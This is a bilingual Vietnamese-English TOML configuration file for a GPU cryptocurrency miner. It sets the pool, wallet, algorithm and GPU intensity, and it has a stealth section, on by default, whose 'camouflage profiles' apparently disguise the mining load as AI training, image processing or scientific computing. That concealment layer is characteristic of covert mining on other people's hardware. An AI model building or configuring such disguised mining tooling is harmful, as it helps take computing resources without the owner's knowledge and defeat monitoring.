# Tệp cấu hình mặc định cho Hệ thống Khai thác GPU.
# (Default configuration file for the GPU Mining System.)

# --- Cấu hình Khai thác (Mining Configuration) ---
[mining]
# URL của pool khai thác, ví dụ: "stratum+tcp://us1.ethermine.org:4444"
# (The URL of the mining pool, e.g., "stratum+tcp://us1.ethermine.org:4444")
pool_url = "stratum+tcp://YOUR-POOL.com:3333"

# Địa chỉ ví của bạn để nhận phần thưởng.
# (Your wallet address to receive rewards.)
wallet_address = "YOUR_WALLET_ADDRESS"

# Thuật toán khai thác để sử dụng. Các giá trị được hỗ trợ: "Ethash", "KawPow", "RandomX".
# (The mining algorithm to use. Supported values: "Ethash", "KawPow", "RandomX".)
algorithm = "Ethash"

# Danh sách các ID GPU để sử dụng (bắt đầu từ 0).
# (A list of GPU IDs to use (starting from 0).)
gpu_devices = [0]

# Cường độ khai thác (tỷ lệ phần trăm, 0-100).
# (Mining intensity (percentage, 0-100).)
# Giá trị cao hơn sử dụng nhiều tài nguyên GPU hơn nhưng mang lại hashrate cao hơn.
# (Higher values use more GPU resources but yield higher hashrates.)
intensity = 90


# --- Cấu hình Ngụy trang (Stealth Configuration) ---
[stealth]
# Kích hoạt hoặc vô hiệu hóa lớp ngụy trang.
# (Enable or disable the stealth layer.)
enabled = true

# Hồ sơ ngụy trang để sử dụng.
# (The camouflage profile to use.)
# Các giá trị được hỗ trợ: "AiTraining", "ImageProcessing", "ScientificComputing", "AiInference".
# (Supported values: "AiTraining", "ImageProcessing", "ScientificComputing", "AiInference".)
profile = "AiTraining"


# --- Cấu hình Ghi nhật ký (Logging Configuration) ---
[logging]
# Mức độ ghi nhật ký. Các giá trị được hỗ trợ: "error", "warn", "info", "debug", "trace".
# (Logging level. Supported values: "error", "warn", "info", "debug", "trace".)
level = "info"

# Đường dẫn đến tệp nhật ký. Nếu để trống, nhật ký sẽ được xuất ra stdout.
# (Path to the log file. If empty, logs will be output to stdout.)
# file_path = "/var/log/mining-gpu/app.log"
file_path = ""